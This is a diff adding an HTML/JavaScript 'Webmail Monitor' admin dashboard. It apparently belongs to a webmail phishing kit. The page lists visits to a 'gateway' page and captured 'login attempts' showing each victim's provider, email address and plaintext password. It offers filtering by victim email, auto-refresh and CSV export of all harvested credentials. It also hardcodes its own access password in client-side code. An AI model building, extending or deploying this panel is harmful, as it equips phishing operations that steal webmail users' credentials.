@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Admin Dashboard • Webmail Monitor</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: #0f172a;
+            color: #e2e8f0;
+            padding: 2rem;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 1rem;
+            align-items: center;
+        }
+        .stats {
+            display: flex;
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+        .stat-card {
+            background: #1e293b;
+            border-radius: 1rem;
+            padding: 1.2rem 1.5rem;
+            flex: 1;
+            min-width: 150px;
+            text-align: center;
+            border: 1px solid #334155;
+            transition: 0.2s;
+        }
+        .stat-card i {
+            font-size: 2rem;
+            color: #3b82f6;
+            margin-bottom: 0.5rem;
+        }
+        .stat-card .number {
+            font-size: 2rem;
+            font-weight: 700;
+        }
+        .filter-bar {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+            align-items: center;
+            background: #1e293b;
+            padding: 0.8rem 1.2rem;
+            border-radius: 2rem;
+        }
+        .filter-bar input, .filter-bar select {
+            background: #0f172a;
+            border: 1px solid #334155;
+            padding: 0.5rem 1rem;
+            border-radius: 2rem;
+            color: white;
+            outline: none;
+            font-size: 0.85rem;
+        }
+        .filter-bar input:focus, .filter-bar select:focus {
+            border-color: #3b82f6;
+        }
+        .filter-bar button, .action-btn {
+            background: #2563eb;
+            border: none;
+            padding: 0.5rem 1.2rem;
+            border-radius: 2rem;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            font-weight: 500;
+            font-size: 0.85rem;
+        }
+        .filter-bar button:hover, .action-btn:hover {
+            background: #1d4ed8;
+        }
+        .copy-btn {
+            background: #475569;
+            margin-left: 0.5rem;
+        }
+        .copy-btn:hover {
+            background: #334155;
+        }
+        .tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 0.5rem;
+        }
+        .tab-btn {
+            background: none;
+            border: none;
+            color: #94a3b8;
+            padding: 0.6rem 1.4rem;
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 2rem;
+            transition: 0.2s;
+        }
+        .tab-btn.active {
+            background: #2563eb;
+            color: white;
+        }
+        .tab-btn:hover:not(.active) {
+            background: #334155;
+            color: white;
+        }
+        .tab-content {
+            display: none;
+            background: #1e293b;
+            border-radius: 1rem;
+            padding: 1.5rem;
+            overflow-x: auto;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.8rem;
+        }
+        th, td {
+            text-align: left;
+            padding: 0.75rem;
+            border-bottom: 1px solid #334155;
+            vertical-align: top;
+        }
+        th {
+            background: #0f172a;
+            position: sticky;
+            top: 0;
+            font-weight: 600;
+            color: #cbd5e1;
+        }
+        tr:hover {
+            background: #2d3a4e;
+        }
+        .badge {
+            display: inline-block;
+            padding: 0.2rem 0.6rem;
+            border-radius: 2rem;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+        .badge-visit {
+            background: #1e3a8a;
+            color: #bfdbfe;
+        }
+        .badge-attempt {
+            background: #991b1b;
+            color: #fecaca;
+        }
+        .login-prompt {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-box {
+            background: #1e293b;
+            padding: 2.5rem;
+            border-radius: 2rem;
+            text-align: center;
+            min-width: 350px;
+            border: 1px solid #334155;
+            box-shadow: 0 20px 25px -12px rgba(0, 0, 0, 0.3);
+        }
+        .login-box .padlock-icon {
+            font-size: 2rem;
+            color: white;
+            margin-bottom: 1rem;
+            display: inline-block;
+        }
+        .login-box h2 {
+            margin-bottom: 0.75rem;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            border-radius: 2rem;
+            border: 1px solid #334155;
+            background: #0f172a;
+            color: white;
+            margin: 1rem 0;
+            outline: none;
+        }
+        .login-box input:focus {
+            border-color: #3b82f6;
+        }
+        .login-box button {
+            background: #2563eb;
+            border: none;
+            padding: 0.6rem 1.5rem;
+            border-radius: 2rem;
+            color: white;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        .error {
+            color: #f87171;
+            margin-top: 1rem;
+            font-size: 0.85rem;
+        }
+        footer {
+            margin-top: 2rem;
+            text-align: center;
+            font-size: 0.75rem;
+            color: #64748b;
+        }
+        .auto-refresh-status {
+            font-size: 0.7rem;
+            margin-left: 0.75rem;
+            background: #1e293b;
+            padding: 0.3rem 0.9rem;
+            border-radius: 2rem;
+            color: #94a3b8;
+        }
+        .action-group {
+            display: flex;
+            gap: 0.7rem;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .gateway-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: #1e293b;
+            padding: 0.3rem 1rem;
+            border-radius: 2rem;
+            text-decoration: none;
+            color: #94a3b8;
+            font-size: 0.85rem;
+        }
+        .gateway-link i {
+            font-size: 0.85rem;
+        }
+        .gateway-link:hover {
+            color: white;
+            background: #334155;
+        }
+        code {
+            background: #0f172a;
+            padding: 0.2rem 0.4rem;
+            border-radius: 0.5rem;
+            font-size: 0.75rem;
+            word-break: break-all;
+        }
+        @media (max-width: 768px) {
+            body { padding: 1rem; }
+            th, td { font-size: 0.7rem; padding: 0.5rem; }
+            .filter-bar { flex-direction: column; align-items: stretch; }
+        }
+    </style>
+</head>
+<body>
+<div id="app"></div>
+
+<script>
+    // ----- CONFIGURATION -----
+    const ADMIN_PASSWORD = 'admin123';   // Must match get_logs.php
+    let logs = [];
+    let autoRefreshInterval = null;
+    let currentPassword = null;
+
+    // UI persistent state (survives auto-refresh & re-renders)
+    let currentActiveTab = 'visits';        // 'visits' or 'attempts'
+    let currentFilterType = 'all';           // 'all', 'visit', 'login_attempt'
+    let currentFilterProvider = '';
+    let currentFilterEmail = '';
+
+    // ----- Helper: fetch logs from server (get_logs.php) -----
+    async function fetchLogs(password, showLoader = true) {
+        const loader = document.getElementById('globalLoader');
+        if (loader && showLoader) loader.style.display = 'inline-block';
+        try {
+            const url = `get_logs.php?password=${encodeURIComponent(password)}`;
+            const response = await fetch(url);
+            const data = await response.json();
+            if (!response.ok || data.error) throw new Error(data.error || 'Unauthorized or server error');
+            
+            // Normalize logs: ensure each entry has type, timestamp, and data object
+            logs = Array.isArray(data) ? data : [];
+            // Log structure expected: { type, timestamp, data: { ... }, remote_ip? }
+            // Ensure missing fields don't break rendering
+            logs = logs.map(log => ({
+                type: log.type || 'unknown',
+                timestamp: log.timestamp || log.server_timestamp || new Date().toISOString(),
+                data: log.data || {},
+                remote_ip: log.remote_ip || log.data?.ip || '-'
+            }));
+            renderDashboard();  // full re-render but with preserved filters/tab
+            return true;
+        } catch (err) {
+            console.error('Fetch error:', err);
+            if (showLoader) {
+                const errorDiv = document.getElementById('loginError');
+                if (errorDiv) errorDiv.innerHTML = `<i class="fas fa-exclamation-triangle"></i> ${err.message}<br><small>Make sure get_logs.php is accessible and password is correct.</small>`;
+            }
+            return false;
+        } finally {
+            if (loader && showLoader) loader.style.display = 'none';
+        }
+    }
+
+    // ----- Auto-refresh (10 seconds) -----
+    function startAutoRefresh(password) {
+        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+        autoRefreshInterval = setInterval(() => {
+            if (currentPassword) fetchLogs(currentPassword, false);
+        }, 10000);
+    }
+    function stopAutoRefresh() {
+        if (autoRefreshInterval) { clearInterval(autoRefreshInterval); autoRefreshInterval = null; }
+    }
+
+    // ----- CSV Export (all logs) -----
+    function exportToCSV() {
+        const headers = ['Timestamp', 'Type', 'IP', 'Location', 'UserAgent', 'URL', 'Provider', 'Email', 'Password'];
+        const rows = logs.map(l => [
+            l.timestamp || '',
+            l.type || '',
+            l.data?.ip || l.remote_ip || '',
+            l.data?.location || '',
+            l.data?.userAgent || '',
+            l.data?.url || '',
+            l.data?.provider || '',
+            l.data?.email || '',
+            l.data?.password || ''
+        ]);
+        const csv = [headers, ...rows].map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',')).join('\n');
+        const blob = new Blob([csv], { type: 'text/csv' });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = `webmail_logs_${Date.now()}.csv`;
+        link.click();
+        URL.revokeObjectURL(link.href);
+    }
+
+    // ----- Copy gateway URL -----
+    function copyGatewayUrl() {
+        const url = window.location.origin + '/index.html';
+        navigator.clipboard.writeText(url).then(() => {
+            const copyBtn = document.querySelector('.copy-btn');
+            if (copyBtn) {
+                const original = copyBtn.innerHTML;
+                copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                setTimeout(() => { copyBtn.innerHTML = original; }, 2000);
+            }
+        }).catch(() => alert('Could not copy URL'));
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[m]));
+    }
+
+    // ----- Apply filters and refresh table content (without full DOM rebuild) -----
+    function refreshTablesAndCounts() {
+        let filtered = [...logs];
+        if (currentFilterType !== 'all') filtered = filtered.filter(l => l.type === currentFilterType);
+        if (currentFilterProvider) filtered = filtered.filter(l => (l.data?.provider || '').toLowerCase().includes(currentFilterProvider.toLowerCase()));
+        if (currentFilterEmail) filtered = filtered.filter(l => (l.data?.email || '').toLowerCase().includes(currentFilterEmail.toLowerCase()));
+
+        const visits = filtered.filter(l => l.type === 'visit');
+        const attempts = filtered.filter(l => l.type === 'login_attempt');
+
+        // Update visits table
+        const visitsBody = document.getElementById('visitsTableBody');
+        if (visitsBody) {
+            visitsBody.innerHTML = visits.map(l => `
+                <tr>
+                    <td>${escapeHtml(new Date(l.timestamp).toLocaleString())}</td>
+                    <td><span class="badge badge-visit">Visit</span></td>
+                    <td>${escapeHtml(l.data?.ip || l.remote_ip || '-')}</td>
+                    <td>${escapeHtml(l.data?.location || '-')}</td>
+                    <td><small>${escapeHtml((l.data?.userAgent || '').substring(0, 65))}</small></td>
+                    <td><small>${escapeHtml((l.data?.url || '').substring(0, 80) || '-')}</small></td>
+                </tr>
+            `).join('');
+            if (visits.length === 0) visitsBody.innerHTML = '<tr><td colspan="6">✨ No visits match the current filters</td></tr>';
+        }
+
+        // Update attempts table
+        const attemptsBody = document.getElementById('attemptsTableBody');
+        if (attemptsBody) {
+            attemptsBody.innerHTML = attempts.map(l => `
+                <tr>
+                    <td>${escapeHtml(new Date(l.timestamp).toLocaleString())}</td>
+                    <td><span class="badge badge-attempt">Login</span></td>
+                    <td>${escapeHtml(l.data?.provider || '-')}</td>
+                    <td>${escapeHtml(l.data?.email || '-')}</td>
+                    <td><code>${escapeHtml(l.data?.password || '-')}</code></td>
+                    <td>${escapeHtml(l.data?.ip || l.remote_ip || '-')}</td>
+                    <td><small>${escapeHtml(l.data?.location?.substring(0, 50) || '-')}</small></td>
+                </tr>
+            `).join('');
+            if (attempts.length === 0) attemptsBody.innerHTML = '<tr><td colspan="7">🔐 No login attempts match the current filters</td></tr>';
+        }
+
+        // Update tab counters
+        const visitCountSpan = document.getElementById('visitCount');
+        const attemptCountSpan = document.getElementById('attemptCount');
+        if (visitCountSpan) visitCountSpan.innerText = visits.length;
+        if (attemptCountSpan) attemptCountSpan.innerText = attempts.length;
+    }
+
+    // ----- Full dashboard render (preserves UI state) -----
+    function renderDashboard() {
+        const totalVisits = logs.filter(l => l.type === 'visit').length;
+        const totalAttempts = logs.filter(l => l.type === 'login_attempt').length;
+        const uniqueIPs = new Set(logs.map(l => l.data?.ip || l.remote_ip).filter(Boolean)).size;
+
+        const html = `
+            <div class="container">
+                <h1>
+                    <span><i class="fas fa-chart-line"></i> Admin Dashboard</span>
+                    <div class="action-group">
+                        <button class="action-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Refresh</button>
+                        <button class="action-btn export-btn" id="exportBtn"><i class="fas fa-download"></i> Export CSV</button>
+                        <span class="gateway-link">
+                            <i class="fas fa-arrow-left"></i> <a href="index.html" style="color: inherit; text-decoration: none;">Back to Gateway</a>
+                            <button class="copy-btn action-btn" id="copyUrlBtn" style="padding: 0.2rem 0.7rem;"><i class="fas fa-copy"></i></button>
+                        </span>
+                        <span class="auto-refresh-status"><i class="fas fa-sync-alt fa-fw"></i> Auto-refresh 10s</span>
+                    </div>
+                </h1>
+                <div class="stats">
+                    <div class="stat-card"><i class="fas fa-eye"></i><div class="number">${totalVisits}</div><div>Total Visits</div></div>
+                    <div class="stat-card"><i class="fas fa-key"></i><div class="number">${totalAttempts}</div><div>Login Attempts</div></div>
+                    <div class="stat-card"><i class="fas fa-globe"></i><div class="number">${uniqueIPs}</div><div>Unique IPs</div></div>
+                </div>
+                <div class="filter-bar">
+                    <select id="filterType">
+                        <option value="all">📌 All Events</option>
+                        <option value="visit">🌐 Visits Only</option>
+                        <option value="login_attempt">🔐 Login Attempts Only</option>
+                    </select>
+                    <input type="text" id="filterProvider" placeholder="Filter by provider (e.g. Gmail, Roundcube)" autocomplete="off">
+                    <input type="text" id="filterEmail" placeholder="Filter by email address" autocomplete="off">
+                    <button id="applyBtn"><i class="fas fa-filter"></i> Apply</button>
+                    <button id="resetBtn"><i class="fas fa-undo-alt"></i> Reset</button>
+                </div>
+                <div class="tabs">
+                    <button class="tab-btn" data-tab="visits">📋 Visits (<span id="visitCount">0</span>)</button>
+                    <button class="tab-btn" data-tab="attempts">🔑 Login Attempts (<span id="attemptCount">0</span>)</button>
+                </div>
+                <div id="visitsTab" class="tab-content">
+                    <table>
+                        <thead><tr><th>Time</th><th>Type</th><th>IP</th><th>Location</th><th>User Agent</th><th>URL</th></tr></thead>
+                        <tbody id="visitsTableBody"></tbody>
+                    </table>
+                </div>
+                <div id="attemptsTab" class="tab-content">
+                    <table>
+                        <thead><tr><th>Time</th><th>Type</th><th>Provider</th><th>Email</th><th>Password</th><th>IP</th><th>Location</th></tr></thead>
+                        <tbody id="attemptsTableBody"></tbody>
+                    </table>
+                </div>
+                <footer>🔒 Logs are stored server‑side in <code>logs.json</code> • Auto‑refresh keeps your current tab & filters.</footer>
+            </div>
+        `;
+
+        document.getElementById('app').innerHTML = html;
+
+        // Restore filter inputs from persistent state
+        const filterTypeSelect = document.getElementById('filterType');
+        const filterProviderInput = document.getElementById('filterProvider');
+        const filterEmailInput = document.getElementById('filterEmail');
+        if (filterTypeSelect) filterTypeSelect.value = currentFilterType;
+        if (filterProviderInput) filterProviderInput.value = currentFilterProvider;
+        if (filterEmailInput) filterEmailInput.value = currentFilterEmail;
+
+        // Restore active tab
+        const visitsTab = document.getElementById('visitsTab');
+        const attemptsTab = document.getElementById('attemptsTab');
+        const tabBtns = document.querySelectorAll('.tab-btn');
+        tabBtns.forEach(btn => {
+            btn.classList.remove('active');
+            if (btn.getAttribute('data-tab') === currentActiveTab) btn.classList.add('active');
+        });
+        if (visitsTab && attemptsTab) {
+            if (currentActiveTab === 'visits') {
+                visitsTab.classList.add('active');
+                attemptsTab.classList.remove('active');
+            } else {
+                attemptsTab.classList.add('active');
+                visitsTab.classList.remove('active');
+            }
+        }
+
+        // Initial table fill
+        refreshTablesAndCounts();
+
+        // ----- Event listeners -----
+        document.getElementById('refreshBtn').onclick = () => { if (currentPassword) fetchLogs(currentPassword, true); };
+        document.getElementById('exportBtn').onclick = exportToCSV;
+        document.getElementById('copyUrlBtn').onclick = copyGatewayUrl;
+
+        const applyBtn = document.getElementById('applyBtn');
+        const resetBtn = document.getElementById('resetBtn');
+        if (applyBtn) {
+            applyBtn.onclick = () => {
+                currentFilterType = document.getElementById('filterType').value;
+                currentFilterProvider = document.getElementById('filterProvider').value;
+                currentFilterEmail = document.getElementById('filterEmail').value;
+                refreshTablesAndCounts();
+            };
+        }
+        if (resetBtn) {
+            resetBtn.onclick = () => {
+                currentFilterType = 'all';
+                currentFilterProvider = '';
+                currentFilterEmail = '';
+                if (filterTypeSelect) filterTypeSelect.value = 'all';
+                if (filterProviderInput) filterProviderInput.value = '';
+                if (filterEmailInput) filterEmailInput.value = '';
+                refreshTablesAndCounts();
+            };
+        }
+
+        // Tab switching
+        document.querySelectorAll('.tab-btn').forEach(btn => {
+            btn.onclick = () => {
+                const tabId = btn.getAttribute('data-tab');
+                if (tabId === 'visits' || tabId === 'attempts') {
+                    currentActiveTab = tabId;
+                    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    if (visitsTab && attemptsTab) {
+                        if (currentActiveTab === 'visits') {
+                            visitsTab.classList.add('active');
+                            attemptsTab.classList.remove('active');
+                        } else {
+                            attemptsTab.classList.add('active');
+                            visitsTab.classList.remove('active');
+                        }
+                    }
+                }
+            };
+        });
+
+        // Enter key on filter inputs triggers Apply
+        const attachEnter = (el) => {
+            if (el) el.addEventListener('keypress', (e) => { if (e.key === 'Enter' && applyBtn) applyBtn.click(); });
+        };
+        attachEnter(filterProviderInput);
+        attachEnter(filterEmailInput);
+    }
+
+    // ----- Login screen (small white padlock) -----
+    function showLogin() {
+        stopAutoRefresh();
+        document.getElementById('app').innerHTML = `
+            <div class="login-prompt">
+                <div class="login-box">
+                    <i class="fas fa-lock padlock-icon"></i>
+                    <h2>Admin Dashboard</h2>
+                    <p>Secure gateway log viewer</p>
+                    <input type="password" id="adminPassword" placeholder="Enter password" autocomplete="off">
+                    <button id="loginBtn"><i class="fas fa-unlock-alt"></i> Login</button>
+                    <div id="loginError" class="error"></div>
+                    <div><span id="globalLoader" style="display:none;"><i class="fas fa-spinner fa-pulse"></i> Authenticating...</span></div>
+                </div>
+            </div>
+        `;
+        const loginBtn = document.getElementById('loginBtn');
+        const pwdInput = document.getElementById('adminPassword');
+        const loginError = document.getElementById('loginError');
+
+        const attemptLogin = async () => {
+            const pwd = pwdInput.value;
+            if (pwd === ADMIN_PASSWORD) {
+                currentPassword = pwd;
+                const success = await fetchLogs(pwd, true);
+                if (success) startAutoRefresh(pwd);
+                else if (loginError) loginError.innerHTML = '<i class="fas fa-times-circle"></i> Failed to fetch logs. Check server and password.';
+            } else {
+                if (loginError) loginError.innerHTML = '<i class="fas fa-ban"></i> Wrong password. Access denied.';
+            }
+        };
+
+        loginBtn.onclick = attemptLogin;
+        pwdInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') attemptLogin(); });
+    }
+
+    // Initialize
+    function init() {
+        currentActiveTab = 'visits';
+        currentFilterType = 'all';
+        currentFilterProvider = '';
+        currentFilterEmail = '';
+        logs = [];
+        currentPassword = null;
+        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+        showLogin();
+    }
+    init();
+</script>
+</body>
+</html>
